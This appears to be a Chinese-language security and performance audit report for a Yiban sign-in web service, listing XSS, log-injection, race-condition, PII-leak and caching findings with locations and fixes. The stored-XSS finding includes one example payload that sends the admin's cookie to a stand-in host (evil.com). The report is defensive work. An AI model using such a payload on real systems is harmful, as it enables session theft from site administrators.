# 对抗性审查报告：安全 + 性能（2026-08-12）

> 审查基准：`server-web` 分支 v0.13.6（已部署生产）。工作区初始在旧分支 `fix/web-security`（0.9.7），审查前已切换。
> 用户决策：先出报告再修；本轮不做易班密码加密存储；性能优化全部评估。
> 三份探索报告基于 0.9.7 生成，本报告在 0.13.6 上逐项回验 + 0.13.x 增量专项。
> **二轮深挖（用户要求"再深入审查"）已追加：T1-T10（安全）、F1-F7（前端/规范）、R1-R2（ruff）、P12-P19（性能补充）。**

---

## 二、二轮深挖新增发现（2026-08-12 同日，0.13.6 基准）

### 安全新增

#### T1. 【高】批量「彻底删除」绕过软删除检查
- **位置**：`web/app.py:917-918`（`api_accounts_batch` 的 `purge` 分支直接 `accounts.pop(i)`，未检查 `deleted` 状态）
- **对比**：单个彻底删除接口（`app.py:998-999`）正确检查了 `deleted`；批量版本遗漏
- **影响**：管理员勾选正常账号批量彻底删除 → 跳过 7 天保留期物理清除，不可恢复；会话被劫持时可静默销毁全部账号
- **建议**：`purge` 分支加 `if not acc.get("deleted"): continue`，与单删行为一致

#### T2. 【中】手动签到防抖 TOCTOU 竞态
- **位置**：`web/app.py:1520-1523`（`_last_trigger` 检查与赋值非原子）
- **影响**：并发请求绕过 30 秒防抖 → 同账号多子进程并发签到 → 触发易班风控（e003）
- **建议**：检查+赋值放入 `threading.Lock()` 临界区

#### T3+T9. 【中】手动签到子进程无超时 + 文件句柄泄漏
- **位置**：`web/app.py:1542-1548`（`Popen` 后立即返回不等待）、`:1534`（`log_fh` 打开后父进程不关闭）
- **影响**：子进程挂起时无限运行 → 进程/句柄累积 → 资源耗尽 DoS
- **建议**：`{phone: Popen}` 字典管理，新触发 terminate 旧进程；父进程关闭 `log_fh`（子进程继承后由子进程持有）

#### T4. 【中】拒绝理由日志注入（Log Forging）
- **位置**：`web/app.py:1033, 1040-1045`（`reject_reason` 仅截断 100 字，无换行过滤后写入 logger）
- **影响**：理由含 `\n` 可伪造日志行（假签到成功/嫁祸账号）
- **建议**：`reason.replace('\n',' ').replace('\r',' ')` 或拒绝控制字符

#### T5. 【中】js2py.eval_js 执行远程 JavaScript
- **位置**：`scripts/signin.py:639-657`（`_solve_ydclearance` 提取易班响应中的 JS 后 `eval_js` 执行）
- **影响**：JS 内容由远程控制；js2py 沙箱逃逸 CVE 历史 → 理论上服务器 RCE 面
- **建议**：用正则/字符串解析 `ydclearance` 值替代执行 JS；或换 `py-mini-racer`/Node 子进程隔离

#### T6. 【低】公告无后端长度限制
- `web/app.py:1624`（仅 strip，前端 maxlength=200 可绕过）→ 后端加 `len(text) > 500 → 400`

#### T7. 【低】`backup-main-20260807/` 目录未纳入 .gitignore
- 若被误提交会泄露历史敏感文件 → `.gitignore` 加 `backup-*/`

#### T8. 【低】`_last_trigger` 字典无清理
- `web/app.py:1509` → load_accounts 时同步清理不在当前 phone 列表的 key

#### T10. 【低】`sys.executable` 无路径校验（供应链纵深）
- `web/app.py:1543` → 校验 `os.path.isfile(script)`

### 前端/规范新增

#### F1. 【高·结构】日历容器重复 DOM id
- `web/templates/index.html:1603, 1626`（同一 card 内 `cal-wrap-{phone}` 出现两次）+「账号管理」「我的账号」跨 tab 同 phone 冲突
- **影响**：`getElementById` 只取第一个 → 日历渲染错位/空壳（功能 bug，与 S3/P6 同源一并修复）
- **建议**：删重复容器；id 改用 index 键（同时解决 S3 手机号进 id）

#### F2. 【中】名称输入 maxlength=20 与后端 50 不一致
- `index.html:497,540`、`user.html:93` → 统一 `maxlength="50"`

#### F3. 【中·防御】md-render.js esc() 不转义单引号
- `md-render.js:7` → 补 `.replace(/'/g, '&#39;')`（防上下文迁移）

#### F4. 【中·规范】`ICONS` 常量死代码
- `index.html:714` 定义未使用 → 删除

#### F5. 【低·规范】多余 `</section>` 闭合标签
- `index.html:528` → 删除

#### F6. 【低·规范】Tailwind dark: 类重复堆叠（多处）
- 同一状态多个 `dark:text-zinc-*` 后者覆盖前者 → 清理（登录页/用户页/管理页标题行）

#### F7. 【低】日历 API `.catch(() => {})` 静默；主题按钮缺 aria-label；tickClock 无 try/catch
- `index.html:302/1672`、`user.html:302`、登录/用户/管理页主题按钮 → 补轻提示/aria-label/防御

### 后端规范（ruff 实测）

#### R1. SIM110 `for` 循环可改 `any()` — `scripts/signin.py:194`
#### R2. B904 ×2 `except` 内 raise 缺 `from` — `scripts/signin.py:266, 289`

（`ruff check web/ scripts/` 全量仅此 3 处错误级问题，整体规范良好）

### 性能补充

#### P12. 【高】登录全量遍历 users + 逐用户哈希
- `web/app.py:623-626`：`for u in load_users(): ... check_password_hash(...)`——O(n) 遍历 + 对匹配用户 scrypt ~100ms；用户量大时登录慢
- 建议：确认是否仅对匹配邮箱执行哈希（是则遍历开销 O(n) 可接受，100 用户 <1ms）；优化为 email→user 映射或短路

#### P13. 【中】6 个搜索框无防抖
- `web/templates/index.html:1461-1484`：每 keystroke 全量 `renderAccounts/renderUsers` → 加 150ms 防抖

#### P14. 【中】load_accounts 惰性清理 O(n×m)
- `web/app.py:219-232`：`a not in expired` 列表身份比较 → 改 `expired` 为 set 判定 O(1)

#### P15. 【中】_effective_role 每请求读 users.json
- `web/app.py:1288-1296`：`before_request → _current_role → load_users()` 全量读盘（高频轮询放大）→ 配合 P4 缓存（users 读多写少同样适用）

#### P16. 【中】/api/announcement 每次 read_env
- `web/app.py:1615-1619` → 缓存公告（写时失效）

#### P17. 【低】mask_account 全量序列化（500 账号 ≈ 100KB 响应）
- 可接受，标注；>500 账号时考虑分页

#### P18. 【低】静态资源无 Cache-Control
- `web/app.py:589-593`：仅页面 no-store；`static/vendor/` 无强缓存 → 加 `send_file` cache_timeout（版本号 URL 已覆盖更新）

#### P19. 【低】_my_account_view 队列计算 O(n²)
- `web/app.py:1094-1109`：`active[:pos]` 切片 + sum 重复遍历 → 单次遍历累计

---

## 一、安全发现（第一轮，0.13.6 基准）

## 一、安全发现

### 高危（必须修复）

#### S1. `display_name` JS 上下文注入（存储型 XSS）
- **位置**：`web/templates/index.html:929, 1009, 1012, 1051`
- **描述**：4 处 `confirm()` / `prompt()` 模板字面量直接拼接用户可控的账号名称：
  ```js
  confirm(`确定彻底删除「${a.display_name}」(${maskPhone(a.phone)}) 吗？...`)
  ```
  `display_name` 来自普通用户提交的账号 `name` 字段（后端仅限长度 ≤50，`web/app.py:288-289`，无内容过滤）。模板字面量中 `${...}` 会被当作 JS 表达式执行。0.13.5 脱敏只处理了 phone，未覆盖 display_name。
- **攻击路径**：普通用户提交名称 = `` ${fetch('//evil.com/'+btoa(document.cookie))} ``（≤50 字符）→ 管理员在账号管理页点击该账号的「通过/拒绝/删除/彻底删除」→ 恶意代码在**管理员浏览器会话**中执行 → 可调用任意 `/api/*`（读取全部账号/用户、提权自身为管理员）。
- **建议**：新增 `jsEscape()`（转义 `\` `` ` `` `${` `$` 与 `${` 序列），4 处模板字面量插值全部包裹；或改用字符串拼接。同时后端对 `name` 字段增加内容校验（禁止 `${`/反引号，或整体转义策略）。

#### S2. 签到日志与 Web 日志含完整手机号/邮箱
- **位置**：
  - `scripts/signin.py:383, 391, 433, 479, 532, 561, 637, 725, 798, 827, 833` — 日志行 `[{phone}] ✅ 签到成功` 格式，`[phone]` 前缀完整手机号
  - `web/app.py:873, 981, 1002, 1028, 1160, 1249` — `logger.info` 直接记录完整 phone；`:697, 823, 1451, 1474` 记录完整 email
  - `web/templates/index.html:840` — 日志面板 `data.logs.join('\n')` 整块展示（管理员可见所有账号手机号+状态关联）
- **影响**：日志文件（sign.log / web 日志）泄露 = 全量手机号泄露；管理员日志面板即手机号清单。
- **注意**：sign.log 的 `[phone]` 是 `parse_sign_log`（`web/app.py:117-134`，`STATE_RE` 正则）解析签到状态的**依赖**，不可直接脱敏文件内容。
- **建议**：sign.log 保持完整（内部解析依赖）；**Web 日志面板展示层脱敏**（前端渲染日志前对 `[11位手机号]` 应用 mask）；`web/app.py` 的 `logger.info` 手机号/邮箱改为脱敏或省略（管理日志不需要完整号）。

#### S3. 日历组件 DOM id / data-phone 含完整手机号
- **位置**：`web/templates/index.html:1603, 1626`（`id="cal-wrap-{phone}"`）、`:1665`（`id="cal-grid-{phone}"`）、`:1661, 1662, 1689`（`data-phone`）；`web/templates/user.html` 同模式（日历翻页/点击）
- **描述**：完整手机号嵌入 DOM id 与属性，可通过 CSS 选择器 `[id^="cal-wrap-"]` 批量枚举全部手机号；页面源码可见。
- **建议**：日历组件改用账号 `index` 作为 DOM id 键（管理后台可用 index；用户页用 owner 内部 id），`data-phone` 保留（操作传参需要）但 id 脱敏；或引入内存映射 `phone → 序号`。

#### S4. 用户管理完整邮箱展示
- **位置**：`web/templates/index.html:1497`（列表单元格完整邮箱 + `title` 悬停）、`:1503`（`data-email` 完整属性）；`web/app.py:1316`（`api_users` 返回完整 `email`）
- **描述**：邮箱为 PII，管理员列表完整展示 + DOM 属性可查 + API 网络层明文。
- **建议**（待用户决策）：显示层脱敏（如 `ad***@example.com`，保留域名）或保持完整——管理员需靠邮箱识别用户，权衡后定；`data-email` 属性建议移入 JS 内存 map（`index → email`）减少 DOM 面。

### 中危

#### S5. API 传输层完整手机号 / owner 邮箱
- **位置**：`web/app.py:282-300`（`mask_account` 返回完整 `phone`、`owner` 完整邮箱）；`:1305-1330`（`api_users` 完整 email）
- **描述**：前端展示已脱敏（0.13.5/0.13.6），但 `/api/accounts`、`/api/users` 响应体仍含完整手机号/邮箱——Network 面板/抓包可见。手动签到、编辑表单、批量操作确实需要完整号（操作可用性 vs 隐私的权衡）。
- **建议**（待用户决策）：方案 A 保持现状（前端已脱敏展示，接受网络层可见，标注风险）；方案 B 列表接口返回脱敏号 + 新增 `/api/accounts/<idx>/full` 详情接口供编辑/签到按需获取完整号（改动中等）。

#### S6. 内置管理员改密后旧会话仍有效
- **位置**：`web/app.py:1279-1290`（`_effective_role` 对内置管理员短路，不校验 `pw_version`）
- **描述**：注册用户改密/被重置后旧 session 立即失效（pw_version 递增）；内置管理员（.env）改密后旧 cookie 最长 30 天有效（`PERMANENT_SESSION_LIFETIME`）。
- **建议**：内置管理员登录时把 `pw_version` 记入 session；改密接口（`:707-745` 附近）递增一个持久化版本值（写入 `.env` 或独立键），`_effective_role` 对内置管理员同样校验。

#### S7. 登录接口无分级限速
- **位置**：`web/app.py:70-72`（全局 60 次/10s/IP）、`api_login` 失败锁定（`:607-612` 已有，按 (IP, username)）
- **描述**：登录接口与普通接口共用全局限速，脚本化密码喷洒难以遏制（失败锁定按用户名三元组，可被随机用户名绕过）。
- **建议**：登录/注册接口单独限速（如 10 次/分钟/IP），且对不存在用户名也做等时校验（防时序侧信道，`L4` 一并处理）。

#### S8. 注册接口邮箱枚举
- **位置**：`web/app.py:686`（`"该邮箱已注册"`）
- **建议**：错误消息统一为「注册失败」+ 固定延迟；或加注册限速。

#### S9. 管理员添加账号时临时密码明文返回
- **位置**：`web/app.py:801-823`
- **描述**：管理员为未注册邮箱添加账号时自动注册用户，临时密码（`token_urlsafe(8)`）明文出现在 API 响应与日志中；经浏览器历史/代理日志可见。
- **建议**：改为管理员自行设置初始密码（表单新增字段），或返回一次性「设置密码」token（使用后失效）。

#### S10. 无 TLS（部署层）
- **位置**：`web/app.py:430-433`（无 `SESSION_COOKIE_SECURE`）；公网 `http://IP:17892` 直连
- **描述**：HTTP 明文传输（session cookie / 登录密码 / 账号信息）；`Secure` cookie 在无 HTTPS 时无意义。
- **建议**：部署层引入 TLS（自签证书 + 浏览器信任，或反代），届时开启 `SESSION_COOKIE_SECURE=True` + 代理 IP 感知（`X-Forwarded-For`）。本轮仅标注，不改代码。

### 低危

#### S11. SECRET_KEY 无轮换机制
- `web/app.py:180-195`（`ensure_secret_key` 仅缺失时生成）。建议：改密操作时顺带轮换（或文档化手动轮换流程）。

#### S12. `owner_display` 邮箱前缀关联泄露
- `web/app.py:252-256` + `index.html:906/955`（归属列显示邮箱前缀）。低（前缀 + 完整号均在 API 可见时信息量有限）。

### 已确认安全（0.9.7 报告项在 0.13.6 的后续状态）
| 0.9.7 项 | 状态 |
|---|---|
| H2 `.env` 提交仓库含弱密码 | ✅ 已修复（`.gitignore` 含 `.env`；`git ls-files` 无 `.env`，仅 `.env.example`） |
| H1 密码明文存储 | ⏸ 用户确认本轮不做，置后续专项 |
| 登录 CSRF / 会话固定 / 失败锁定 / 主管理员校验 / 批量接口管理员守卫 / 软删除越权 | ✅ 验证通过（`require_login` 全覆盖、`session.clear()`、`(IP,username)` 锁定、批量/软删除接口均在管理员守卫内） |
| 前端 esc() 覆盖 / 公告 textContent / 菜单 DOM API / localStorage 无敏感数据 | ✅ 验证通过 |

---

## 二、性能发现

### 高

#### P1. 日历接口每月 30 次文件 IO
- **位置**：`web/app.py:1178-1187`（`api_my_calendar` 循环 `days_in_month` 次：每次 `os.path.exists` + `open` + `json.load`）
- **描述**：一次日历请求 = 约 30 次磁盘 stat + 30 次 JSON 解析。多用户并发查看日历放大。
- **建议**：改为单次目录扫描（`os.scandir(state_dir)` 一次遍历当天文件）或聚合缓存（按 (year, month) 缓存当日结果，写日志后失效）。

### 中

#### P2. `_my_account_view` 双重解析日志
- **位置**：`web/app.py:1091-1092`（连续两次 `parse_sign_log(LOG_FILE)`：各做一次 `_tail_lines` 读盘 + 全文正则）
- **建议**：单次解析，结果同时用于 states 与 recent。

#### P3. 添加账号时锁内执行密码哈希
- **位置**：`web/app.py:791`（`with _file_lock`）→ `:817`（`generate_password_hash`，scrypt ~100ms）
- **描述**：持全局锁期间执行哈希，所有其他请求（含 10s 轮询）排队等待。
- **建议**：哈希移出锁（先哈希后加锁写盘）；锁内只保留文件读写。

#### P4. accounts.json 零内存缓存
- **位置**：`web/app.py:215-218`（`load_accounts` 每次全量 `json.load`）；前端 10s 轮询 `/api/accounts`（`index.html:1134`）
- **描述**：每在线用户每 10s 读盘一次；多用户并发放大。
- **建议**：读多写少模式——启动/首次加载缓存，写操作（增删改/批量/审核）后失效重载；`RLock` 保护缓存一致性。

#### P5. 10s 轮询全量重建表格 DOM
- **位置**：`web/templates/index.html:1134`（`refreshAccountsSilent`）→ `:857`（`tbody.innerHTML=''` 全量重建）
- **描述**：每 10s 重建整个账号表；账号 >50 行时低配设备卡顿（DOM 重建 + reflow）。
- **建议**：条件渲染——仅状态/数据变化时重建（对比 `state.states` 或维护轻量指纹）；或日志轮询与表格刷新解耦（表格仅在可见且有变化时刷新）。

#### P6. 日历重复 DOM id（功能 bug）
- **位置**：`web/templates/index.html:1603, 1626`（`renderMine` 对同一 phone 插入两个 `cal-wrap-{phone}`）
- **描述**：`$('cal-wrap-'+phone)` 只取到第一个（空壳），日历实际渲染到第二个 div——与 S3 的 id 改造一并修复。
- **建议**：去除重复容器（保留一个），id 改用 index 键。

### 低

#### P7. `/api/users` 双文件读
- `web/app.py:1311-1312`（`load_users` + `load_accounts` 串行两次读盘）→ 单次遍历统计账号数。

#### P8. 更新日志每次点击读盘
- `web/app.py:1609-1610` → 启动时读一次缓存（文件几乎不变）。

#### P9. 静态资源体积
- `tailwind.js` 407KB、`logo.png` 178KB、`fonts/misans/` 6.9MB（woff2 分片按需加载，实际下载少）、`index.html` ~100KB 内联 JS（版本更新时全量重下，无缓存复用）。
- 建议：静态资源加 `Cache-Control` 长缓存（`web_version` 变化时 URL 带参刷新已覆盖更新）；评估 tailwind 构建版（按需生成 CSS，可降至 ~20KB）——改动中等，收益看带宽。

#### P10. 写操作后全量列表重载（无乐观更新）
- 删除/审核/批量后 `loadAccounts()` 全量重载。当前数据量可接受；>100 行时改为局部 DOM 更新。

#### P11. 日志面板整块替换
- `index.html:840`（`textContent` 整块替换 80 行）。可接受，无需处理。

---

## 三、修复分组建议（待确认后执行）

| 组 | 内容 | 涉及 |
|---|---|---|
| **组 1 · 安全高危** | S1 display_name JS 注入；S2 日志手机号脱敏（web logger + 日志面板展示层）；S3 日历 id 脱敏；S4 邮箱显示决策 | index.html、app.py、signin.py（仅展示层） |
| **组 2 · 安全中危** | S6 内置管理员 pw_version；S7 登录限速分级 + 等时校验；S8 注册枚举缓解；S9 临时密码流程优化 | app.py、index.html |
| **组 3 · 性能** | P1 日历聚合读；P2 单次日志解析；P3 哈希移出锁；P4 accounts 缓存；P5 条件渲染；P6 重复 id 修复；P7 users 单读；P8 changelog 缓存 | app.py、index.html |
| **组 4 · 低危** | S5 API 传输方案（待决策）；S11 密钥轮换文档；P9 静态资源缓存头 | app.py、部署 |
| **后续专项** | 易班密码加密存储（用户已确认后续）；TLS 部署 + Secure cookie | 部署 |

## 四、待用户决策项
1. S4 用户管理邮箱：显示层脱敏（ad***@example.com）还是保持完整？
2. S5 API 传输层：保持现状（前端已脱敏）还是新增详情接口方案？
3. 组 1~4 修复范围与顺序确认。

---

## 五、已知限制与后续项（0.15 补充）

> 以下三项为当前实现的**结构性已知限制**（非本次修复引入），暂不改变数据模型，先行文档化风险与缓解建议，供后续版本决策。

### L9. 并发编辑丢失更新（缺乐观锁）
- **现状**：账号编辑为整条字段覆盖（PUT 全量写 `accounts[idx]`），无版本号/时间戳比较；两人同时编辑同一账号（或多标签页编辑），后提交者覆盖先提交者的修改，先提交的变更**静默丢失**，无任何提示。
- **风险等级**：中（单管理员日常使用触发概率低；多人协作/双标签页时会发生）
- **缓解建议（按成本排序）**：
  1. 短期：编辑打开/提交前重新拉取列表快照，`updated_at` 或内容指纹变化则提示"数据已变化，请刷新后重试"；
  2. 中期：账号记录增加 `updated_at`（或 `version`）字段，PUT 时携带前端读取时的版本，后端不匹配返回 409 + 最新数据；
  3. 长期：换 SQLite/数据库行级锁与事务。

### L8. 索引寻址漂移（按数组下标操作）
- **现状**：增删改/排序/批量操作均以数组下标寻址（`/api/accounts/<idx>`、`/api/my-accounts/<idx>`、`move` 排序）；任一并发增删或排序都会使**其他已打开的页面/未刷新轮询**持有下标失效——操作可能命中错误账号（改错人/删错人）。
- **风险等级**：中高（双管理员并发管理时存在改错对象的实际风险；前端 10s 轮询缓解但非消除）
- **缓解建议**：
  1. 操作接口改用**稳定唯一 ID**（如账号 uuid 字段）寻址，下标仅作展示序号；
  2. 过渡期：行操作执行前用轮询快照校验 `index` 对应记录指纹（phone/name）是否仍与操作目标一致，不一致则拦截并提示刷新；
  3. 前端对 404/错位返回做"列表已变化"友好提示而非静默失败。

### L17. 外部并发修改覆盖（整文件读-改-写）
- **现状**：`accounts.json` / `users.json` 为整文件读-改-写，进程内 `_file_lock` 只保护 web 进程自身；**进程外部**的直接编辑（人工改文件、备份恢复、cron 脚本写日志同目录文件）与 web 写入并发时，最后写者覆盖，中间修改丢失；写入中断还可能留下半截损坏文件（当前 `save_accounts` 直接覆盖目标文件，无原子替换）。
- **风险等级**：中（正常运维不触发；人工干预/备份恢复窗口内触发）
- **缓解建议**：
  1. 写盘改为**临时文件 + `os.replace()` 原子替换**，杜绝半截文件；
  2. 写入前比对文件 `mtime`/`size`，外部变更则先重读合并再写（或拒绝写入并告警）；
  3. 运维约定：任何外部修改/备份恢复前先停 web 服务（systemd stop），或通过管理界面操作，禁止直接编辑运行中的数据文件。
